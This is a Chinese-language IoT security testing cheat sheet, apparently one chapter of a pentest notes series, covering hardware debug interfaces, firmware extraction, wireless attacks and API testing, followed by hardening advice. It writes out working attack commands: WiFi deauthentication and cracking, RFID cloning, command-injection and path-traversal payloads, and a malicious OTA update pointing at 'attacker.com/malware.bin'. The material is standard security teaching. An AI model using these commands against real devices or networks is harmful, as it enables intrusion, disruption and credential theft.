# IoT与嵌入式安全

> 从固件逆向到无线攻击，系统掌握物联网安全测试技术

---

## 一、IoT安全概述

### 1.1 IoT攻击面

```mermaid
flowchart TD
    A[IoT设备] --> B[硬件层面]
    A --> C[固件层面]
    A --> D[网络层面]
    A --> E[应用层面]
    A --> F[云/后端]
    
    B --> B1[JTAG/SWD调试接口]
    B --> B2[UART串口]
    B --> B3[SPI/I2C总线]
    B --> B4[芯片解密]
    
    C --> C1[固件提取]
    C --> C2[逆向分析]
    C --> C3[签名绕过]
    C --> C4[更新机制漏洞]
    
    D --> D1[无线协议]
    D --> D2[网络服务]
    D --> D3[MITM攻击]
```

### 1.2 常见漏洞

| 类型 | 漏洞 | 影响 |
|:-----|:-----|:-----|
| 硬件 | 调试接口未锁 | 完全控制设备 |
| 固件 | 硬编码凭证 | 凭据泄露 |
| 固件 | 未签名更新 | 恶意固件加载 |
| 网络 | 明文通信 | 数据窃取 |
| 网络 | 弱加密 | 中间人攻击 |
| Web | 默认密码 | 未授权访问 |
| 云 | API漏洞 | 批量控制设备 |
| 移动端 | 存储不安全 | 用户数据泄露 |

### 1.3 测试环境

```bash
# 硬件工具
# - 逻辑分析仪 (Saleae)
# - JTAGulator
# - Bus Pirate
# - ChipWhisperer
# - USRP (SDR)
# - HackRF One
# - Proxmark3 (RFID)

# 软件工具
# - Binwalk (固件分析)
# - Ghidra/IDA (逆向)
# - QEMU (模拟运行)
# - OpenOCD (调试)
# - Wireshark (网络)
# - Gm510 (基带)

# 安装Binwalk
git clone https://github.com/ReFirmLabs/binwalk
cd binwalk
sudo python3 setup.py install
```

---

## 二、硬件攻击

### 2.1 调试接口

```bash
# JTAG/SWD识别
# 使用JTAGulator
# 连接测试点
# 自动识别引脚

# OpenOCD调试
# 配置文件
source [find interface/ftdi/jtagkey2.cfg]
transport select jtag
adapter_khz 1000

# 连接到目标
openocd -f board/stm32f4discovery.cfg

# GDB调试
gdb-multiarch
target remote :3333
monitor reset halt
flash write_image erase firmware.bin 0x08000000
verify_image firmware.bin 0x08000000
resume

# 读取Flash
# 使用JLink
JLinkExe -device STM32F407VG -speed 4000
connect
savebin firmware.bin 0x08000000 0x100000
exit
```

### 2.2 UART串口

```bash
# 识别UART引脚
# 使用逻辑分析仪或示波器
# 特征: 3.3V/5V TX RX GND

# 连接UART
screen /dev/ttyUSB0 115200
# 或
minicom -D /dev/ttyUSB0 -b 115200

# 常用波特率
# 9600, 19200, 38400, 57600, 115200

# 自动波特率检测
python3 << 'EOF'
import serial
for baud in [9600, 19200, 38400, 57600, 115200, 230400]:
    try:
        ser = serial.Serial('/dev/ttyUSB0', baud, timeout=1)
        data = ser.read(100)
        if data:
            print(f"Baud {baud}: {data.hex()}")
        ser.close()
    except:
        pass
EOF

# UART启动引导
# 启动时在UART上发送特定键(回车/空格)
# 可能进入uboot/bootloader
# uboot控制台 → 可修改启动参数
```

### 2.3 SPI/I2C总线

```bash
# SPI Flash读取
# 使用flashrom
flashrom -p buspirate_spi:dev=/dev/ttyUSB0 -r firmware.bin
flashrom -p linux_spi:dev=/dev/spidev0.0 -r firmware.bin

# 使用总线盗贼(Bus Pirate)
# 连接SPI引脚
# 模式: SPI
# 速度: 1MHz
# 读取flash

# I2C设备枚举
i2cdetect -y 1

# I2C读取
i2cget -y 1 0x50 0x00 w

# 逻辑分析仪捕获
# 使用Saleae/PulseView
# 捕获SPI/I2C通信
# 分析协议
```

### 2.4 侧信道攻击

```bash
# 功耗分析 (SPA/DPA)
# 使用ChipWhisperer
# 捕获加密操作的功耗轨迹
# 分析密钥

# 电磁辐射分析
# 使用近场探头
# 捕获电磁辐射
# 分析密钥

# 故障注入
# 电压毛刺
# 时钟毛刺
# 电磁脉冲
# 激光注入

# 时序攻击
# 测量操作时间
# 推断秘密数据
```

---

## 三、固件分析

### 3.1 固件提取

```bash
# 从Flash芯片读取
# 使用编程器 (CH341A/TL866)
flashrom -p ch341a_spi -r firmware.bin

# 从更新文件提取
# 解压固件更新包
binwalk -Me firmware.bin

# 识别文件系统
binwalk -T firmware.bin

# 提取Squashfs
dd if=firmware.bin of=squashfs.img bs=1 skip=0x100000 count=0x500000
unsquashfs squashfs.img

# 提取Cramfs
cramfsck -x output/ firmware.bin

# 提取JFFS2
jefferson firmware.bin -d output/

# UBI/UBIFS
ubireader_extract_images firmware.bin
```

### 3.2 固件分析

```bash
# 文件系统分析
ls -la output/
ls output/etc/
cat output/etc/passwd
cat output/etc/shadow
cat output/etc/config/*

# 搜索硬编码凭证
grep -r "password\|secret\|key\|token" output/
grep -r "admin\|root\|default" output/etc/
strings firmware.bin | grep -i "password\|user"

# 搜索IP/域名
strings firmware.bin | grep -E "\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b"
strings firmware.bin | grep -E "[a-z0-9]+(\.[a-z0-9]+)+"

# 搜索私钥
grep -r "BEGIN RSA\|BEGIN EC\|BEGIN DSA\|BEGIN OPENSSH\|BEGIN PRIVATE" output/

# 识别架构
binwalk -A firmware.bin

# 提取内核
binwalk -D 'linux kernel:kernel.bin' firmware.bin

# 分析文件系统类型
file output/*
```

### 3.3 固件逆向

```bash
# 使用Ghidra
# 创建项目 → 导入固件 → 选择架构
# ARM/MIPS/PPC/M68K/RISC-V

# 识别函数
# 查找字符串引用
# 查找交叉引用
# 识别库函数

# 常见分析目标
# - 更新验证逻辑
# - 加密/解密函数
# - 认证机制
# - 后门/调试接口

# 模拟运行 (QEMU)
# 用户模式模拟
qemu-arm -L ./output/ ./output/bin/busybox

# 系统模式模拟
qemu-system-arm -M versatilepb -kernel vmlinuz -initrd initrd.img

# 使用Firmadyne
sudo ./firmadyne/firmadyne.sh
./scripts/makeImage.sh firmware.bin firmware_id
./scripts/run.sh firmware_id

# 使用FirmAE
sudo ./run.sh -c brand firmware.bin
```

---

## 四、网络协议攻击

### 4.1 WiFi攻击

```bash
# WiFi嗅探
airodump-ng wlan0mon
airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w capture wlan0mon

# WPA/WPA2破解
aircrack-ng -w wordlist.txt capture-01.cap

# WPS PIN攻击
reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -vv

# 邪恶双子攻击
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Deauth攻击
aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon

# PMKID攻击
hcxdumptool -o capture.pcapng -i wlan0mon
hcxpcaptool -z pmkid.txt capture.pcapng
hashcat -m 16800 pmkid.txt wordlist.txt
```

### 4.2 BLE攻击

```bash
# BLE扫描
hcitool scan
hcitool lescan

# BLE信息
gatttool -b XX:XX:XX:XX:XX:XX -I
connect
primary
characteristics

# BLE读写
char-read-hnd 0x002e
char-write-req 0x002e 0100

# BLE嗅探
# 使用Ubertooth
ubertooth-btle -f -c capture.pcapng
wireshark capture.pcapng

# BLE安全
# 检测认证要求
# 检查配对方式(JIW/JustWorks)
# 检查加密强度
# 检查服务特征

# BLE Spoofing
gatttool -b XX:XX:XX:XX:XX:XX -I
# 模拟设备
```

### 4.3 Zigbee攻击

```bash
# Zigbee扫描
# 使用Zigbee适配器(如CC2531)
# Killerbee工具
zbid.py
zbwireshark

# Zigbee嗅探
zbdump -c 11 -f capture.pcap

# Zigbee重放
zbreplay -f capture.pcap

# Zigbee密钥提取
# 使用TouchLink攻击
# 捕获密钥协商过程

# 攻击场景
# - 密钥提取
# - 重放攻击
# - 设备伪装
# - 网络泛洪
```

### 4.4 RFID/NFC攻击

```bash
# Proxmark3
# 低频(125kHz)/高频(13.56MHz)

# 扫描
lf search
hf search

# 克隆低频卡
lf em 410x read
lf em 410x clone --id 12345678

# 克隆高频卡
hf mf chk --key tests.keys
hf mf rdbl 0 A FFFFFFFFFFFF
hf mf wrbl 0 A FFFFFFFFFFFF 0000000000000000

# MIFARE Classic攻击
# Nested攻击
hf mf nested --key A 000000000000 --blk 0 --target sector 1

# Hardnested攻击
hf mf hardnested --blk 0 --key A 000000000000

# 模拟UID
hf mf sim --4b --uid 12345678
```

---

## 五、Web接口与API安全

### 5.1 常见漏洞

```bash
# 默认密码检查
curl -u admin:admin http://device.local/
curl -u root:root http://192.168.1.1/
curl http://admin:1234@192.168.1.1/

# 命令注入
curl "http://device.local/cgi-bin/exec?cmd=ls"
curl "http://device.local/command?cmd=;id"

# 路径遍历
curl "http://device.local/../../../etc/passwd"
curl "http://device.local/files?file=../../../etc/shadow"

# 认证绕过
curl "http://device.local/admin.html?authenticated=false"
curl -H "Cookie: admin=1" http://device.local/settings

# API漏洞
curl "http://device.local/api/device/info"
curl "http://device.local/api/device/restart"
curl -X POST -d '{"firmware_url":"http://attacker.com/malware.bin"}' http://device.local/api/ota/update
```

### 5.2 固件OTA分析

```bash
# 截获更新请求
# 使用Burp/mitmproxy
mitmproxy -p 8080 --ssl-insecure

# 分析更新流程
# 1. 检查更新签名验证
# 2. 检查更新源验证
# 3. 检查更新包加密
# 4. 检查回滚保护

# 模拟更新服务器
python3 -m http.server 8000
# 重定向DNS
echo "127.0.0.1 update.device.com" >> /etc/hosts
```

---

## 六、移动应用分析

### 6.1 APK分析

```bash
# APK反编译
apktool d app.apk -o output/
jadx-gui app.apk

# 搜索API端点
grep -r "http\|https\|api\|cloud" output/smali/

# 搜索密钥
grep -r "apiKey\|secret\|token\|password" output/
strings app.apk | grep -i "api_key\|secret"

# 硬编码IoT凭证
# MQTT凭证
# 云平台API密钥
# 设备配对密码
# AES/SSL密钥
```

---

## 七、云/后端API

### 7.1 常见端点

```bash
# 设备注册
POST /api/device/register
{"device_id": "...", "token": "..."}

# 固件更新
GET /api/firmware/latest?device_type=xxx
POST /api/firmware/download/{id}

# 数据上传
POST /api/telemetry
{"device_id": "...", "temperature": 25}

# 远程控制
POST /api/device/command
{"device_id": "...", "command": "lock"}

# 用户API
GET /api/user/devices
POST /api/user/reset_password

# MQTT
mqtt://cloud.iot.com:1883
# 主题: devices/{id}/data
# 主题: devices/{id}/command
```

### 7.2 API安全测试

```bash
# IDOR测试
curl "http://cloud.iot.com/api/device/data?device_id=1"
curl "http://cloud.iot.com/api/device/data?device_id=2"

# 批量分配
POST /api/device/register
{"device_id": "123", "is_admin": true}

# 参数篡改
curl -X POST -d "temperature=99&command=shutdown" "http://cloud.iot.com/api/device/control"

# 认证绕过
curl -H "Authorization: Bearer invalid" "http://cloud.iot.com/api/admin/devices"
```

---

## 八、协议逆向

### 8.1 串口协议分析

```bash
# 捕获串口通信
# 使用逻辑分析仪/UART监听

# 分析协议结构
# 帧头(0xAA 0x55)
# 长度
# 命令
# 数据
# 校验(CRC/Checksum)

# Python协议分析
python3 << 'EOF'
import serial

ser = serial.Serial('/dev/ttyUSB0', 115200, timeout=1)

def analyze_packet(data):
    if len(data) < 5:
        return
    
    # 帧头检查
    if data[0] != 0xAA:
        return
    
    length = data[1]
    cmd = data[2]
    payload = data[3:3+length]
    checksum = data[3+length]
    
    print(f"CMD: {cmd:02x}, Len: {length}, Payload: {payload.hex()}")

while True:
    data = ser.read(100)
    if data:
        analyze_packet(data)
EOF
```

---

## 九、工具总结

### 9.1 硬件工具

| 工具 | 用途 | 价格 |
|:-----|:-----|:-----|
| Saleae Logic Pro | 逻辑分析仪 | $399+ |
| JTAGulator | JTAG/SWD识别 | $150 |
| Bus Pirate | 多协议调试 | $30 |
| HackRF One | SDR(1MHz-6GHz) | $300 |
| ChipWhisperer | 侧信道/故障注入 | $500+ |
| Proxmark3 | RFID/NFC分析 | $250 |
| Ubertooth One | BLE分析 | $120 |
| USRP | SDR(软件无线电) | $700+ |

### 9.2 软件工具

| 工具 | 用途 | 链接 |
|:-----|:-----|:-----|
| Binwalk | 固件分析 | github.com/ReFirmLabs/binwalk |
| Ghidra | 逆向分析 | ghidra-sre.org |
| Firmadyne | IoT模拟 | github.com/firmadyne |
| FirmAE | 全固件模拟 | github.com/pr0v3rbs/FirmAE |
| Killerbee | Zigbee攻击 | github.com/riverloopsec/killerbee |
| Gattacker | BLE攻击 | github.com/ctaprotocol/gattacker |
| BlueZ | BLE协议栈 | bluez.org |
| QEMU | 模拟器 | qemu.org |

---

## 十、安全加固

### 10.1 开发建议

```
硬件:
□ 锁定JTAG/SWD
□ 去除调试串口
□ 加密Flash
□ 防篡改检测
□ 安全元件

固件:
□ 安全启动链
□ 签名固件更新
□ 加密存储
□ 移除调试功能
□ 地址空间随机化

通信:
□ TLS/mTLS
□ 证书验证
□ 协议最小化
□ 定期轮换密钥

Web/API:
□ 强认证
□ API速率限制
□ 输入验证
□ 最小权限
```

---

## 十一、速查总表

### 11.1 命令速查

```bash
# 固件提取
binwalk -Me firmware.bin
flashrom -p ch341a_spi -r firmware.bin

# UART连接
screen /dev/ttyUSB0 115200

# JTAG调试
openocd -f board/stm32f4discovery.cfg

# WiFi攻击
airodump-ng wlan0mon
aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon

# BLE扫描
hcitool lescan

# RFID克隆
lf em 410x clone --id 12345678
```

### 11.2 检查清单

```
□ 调试接口安全
□ 固件完整性
□ 默认密码修改
□ 通信加密
□ 更新机制安全
□ Web接口安全
□ 移动应用安全
□ 云API安全
□ 物理安全
□ 日志审计
```

---

> **参考资源**
>
> - OWASP IoT Security Testing Guide
> - Attify IoT Security
> - Embedded Security CTF
> - HackRF/FIRMADYNE Documentation
> - Practical IoT Hacking
> - The Hardware Hacking Handbook


[二进制漏洞利用（PWN）全技巧](39-pwn.md)